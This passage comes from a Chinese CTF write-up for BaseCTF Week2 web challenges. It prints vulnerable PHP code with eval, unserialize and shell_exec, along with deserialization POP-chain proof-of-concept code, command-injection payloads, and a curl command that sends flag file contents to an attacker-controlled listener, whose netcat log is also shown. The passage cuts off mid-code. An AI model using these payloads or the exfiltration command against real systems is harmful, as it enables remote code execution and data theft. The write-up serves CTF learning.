</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;DT&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>eval</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://challenge.basectf.fun:30606/?DT=echo `tac /f*`;
</span></span></code></pre></td></tr></table></div></div><h2 id=week2-ez_ser>[Week2] ez_ser</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>re</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu0</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;I can not believes!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>chu0</span><span class=o>-&gt;</span><span class=nv>$nononono</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>web</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$kw</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$dt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;lalalla&#34;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>kw</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;ALL Done!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>pwn</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$dusk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$over</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>dusk</span> <span class=o>!=</span> <span class=s2>&#34;gods&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;什么，你竟敢不认可?&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>over</span><span class=o>-&gt;</span><span class=na>getflag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Misc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$nothing</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getflag</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=s2>&#34;system(&#39;cat /flag&#39;);&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Crypto</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;happy happy happy!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>getflag</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;you are over!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$ser</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;ser&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>web::wakeup-&gt;re::toString-&gt;pwn::get-&gt;Misc::getflag
</span></span></code></pre></td></tr></table></div></div><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>re</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$chu0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>web</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$kw</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$dt</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>pwn</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$dusk</span><span class=o>=</span><span class=s2>&#34;gods&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$over</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Misc</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$nothing</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>web</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>kw</span><span class=o>=</span><span class=k>new</span> <span class=nx>re</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>kw</span><span class=o>-&gt;</span><span class=na>chu0</span><span class=o>=</span><span class=k>new</span> <span class=nx>pwn</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>kw</span><span class=o>-&gt;</span><span class=na>chu0</span><span class=o>-&gt;</span><span class=na>over</span><span class=o>=</span><span class=k>new</span> <span class=nx>misc</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=week2-really-ez-pop>[Week2] Really EZ POP</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sink</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;echo 123;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Shark</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$word</span> <span class=o>=</span> <span class=s1>&#39;Hello, World!&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;Shark says:&#39;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>word</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sea</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$animal</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$sea_ani</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>animal</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s1>&#39;In a deep deep sea, there is a &#39;</span> <span class=o>.</span> <span class=nv>$sea_ani</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Nature</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$sea</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sea</span><span class=o>-&gt;</span><span class=na>see</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;nature&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$nature</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;nature&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Natrue::destruct-&gt;Sea::get-&gt;Shark::invoke-&gt;Sink::toString
</span></span></code></pre></td></tr></table></div></div><p>写个<code>poc</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sink</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span> <span class=o>=</span> <span class=s1>&#39;system(&#34;ls&#34;);&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Shark</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$word</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Sea</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$animal</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Nature</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$sea</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>Nature</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>sea</span><span class=o>=</span><span class=k>new</span> <span class=nx>Sea</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>sea</span><span class=o>-&gt;</span><span class=na>animal</span><span class=o>=</span><span class=k>new</span> <span class=nx>Shark</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>sea</span><span class=o>-&gt;</span><span class=na>animal</span><span class=o>-&gt;</span><span class=na>word</span><span class=o>=</span><span class=k>new</span> <span class=nx>Sink</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>但是环境是私有属性所以我们自己手动改一下就好了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>nature=O:6:&#34;Nature&#34;:1:{s:3:&#34;sea&#34;;O:3:&#34;Sea&#34;:1:{s:6:&#34;animal&#34;;O:5:&#34;Shark&#34;:1:{s:11:&#34;%00Shark%00word&#34;;O:4:&#34;Sink&#34;:1:{s:9:&#34;%00Sink%00cmd&#34;;s:18:&#34;system(&#34;tac /f*&#34;);&#34;;}}}}
</span></span></code></pre></td></tr></table></div></div><h2 id=week2-rceisamazingwithspace>[Week2] RCEisamazingwithspace</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cmd=tac$IFS$1/f*
</span></span></code></pre></td></tr></table></div></div><h2 id=week2-一起吃豆豆>[Week2] 一起吃豆豆</h2><p>查看源码发现<code>base64</code>，解码即可</p><h2 id=week2-你听不到我的声音>[Week2] 你听不到我的声音</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span></code></pre></td></tr></table></div></div><p>这道题本来是想弹<code>shell</code>的但是没成功，然后使用<code>curl</code>即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>cmd=curl http://IP:9999/`tac /f*`
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# nc -lvnp 9999
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 9999
</span></span><span class=line><span class=cl>Connection received on 27.25.151.198 36247
</span></span><span class=line><span class=cl>GET /BaseCTFb8ce572d-8b9c-40f5-8e1a-ab03312750af HTTP/1.1
</span></span><span class=line><span class=cl>Host: 27.25.151.48:9999
</span></span><span class=line><span class=cl>User-Agent: curl/7.74.0
</span></span><span class=line><span class=cl>Accept: */*
</span></span></code></pre></td></tr></table></div></div><h2 id=week2-所以你说你懂-md5>[Week2] 所以你说你懂 MD5?</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// 所以你说你懂 MD5 了?
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=nv>$apple</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;apple&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$banana</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;banana&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=nv>$apple</span> <span class=o>!==</span> <span class=nv>$banana</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$apple</span><span class=p>)</span> <span class=o>===</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$banana</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;加强难度就不会了?&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 什么? 你绕过去了?
</span></span></span><span class=line><span class=cl><span class=c1>// 加大剂量!
</span></span></span><span class=line><span class=cl><span class=c1>// 我要让他成为 string
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$apple</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;appple&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$banana</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;bananana&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$apple</span> <span class=o>!==</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$banana</span> <span class=o>&amp;&amp;</span> <span class=nx>md5</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$apple</span><span class=p>)</span> <span class=o>==</span> <span class=nx>md5</span><span class=p>((</span><span class=nx>string</span><span class=p>)</span><span class=nv>$banana</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;难吗?不难!&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// 你还是绕过去了?
</span></span></span><span class=line><span class=cl><span class=c1>// 哦哦哦, 我少了一个等于号
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$apple</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;apppple&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$banana</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;banananana&#39;</span><span class=p>];</span>
